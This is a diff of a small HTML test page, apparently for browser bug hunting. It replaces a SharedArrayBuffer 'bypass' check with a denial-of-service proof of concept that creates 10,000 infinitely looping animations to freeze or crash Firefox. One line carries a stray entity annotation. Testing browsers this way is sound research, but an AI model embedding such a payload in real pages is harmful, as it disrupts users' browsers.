@@ -1,18 +1,47 @@
 <html>
-<head><title>test</title></head>
+<head>
+<title>test</title>
+</head>
 <body>
-<p>sab test - 1 domain only</p>
+
+<p>animation DoS test - real API</p>
 <button onclick="go()">click here</button>
 <p id="h"></p>
+<p id="h2"></p>
+
 <script>
 function go(){
+  document.getElementById('h').innerText = 'creating animations - real API...';
+
+  var start = performance.now();
+  var count = 0;
+
   try {
-    var sab = new SharedArrayBuffer(1024);
-    document.getElementById('h').innerText = 'BYPASS! SharedArrayBuffer created: ' + sab.byteLength + ' bytes';
+    // bikin 10000 animasi beneran, bukan simulasi
+    for(let i=0; i<10000; i++){
+      var div = document.createElement('div');
+      div.style.width = '10px';
+      div.style.height = '10px';
+      div.style.background = 'red';
+      document.body.appendChild(div);
+
+      // ini API asli: element.animate()
+      div.animate(
+        [{ opacity: 0, transform: 'translateX(0px)' }, { opacity: 1, transform: 'translateX(100px)' }],
+        { duration: 1000, iterations: Infinity }
+      );
+      count++;
+    }
+
+    var end = performance.now();
+    document.getElementById('h').innerText = 'created ' + count + ' real animations in ' + (end-start).toFixed(1) + 'ms';
+    document.getElementById('h2').innerText = 'if 【entity-Firefox¦canonical_name=Firefox】 freezes / lags / crashes now, it is DoS. Try scrolling / closing tab.';
+
   } catch(e) {
     document.getElementById('h').innerText = 'blocked: ' + e;
   }
 }
 </script>
+
 </body>
 </html>
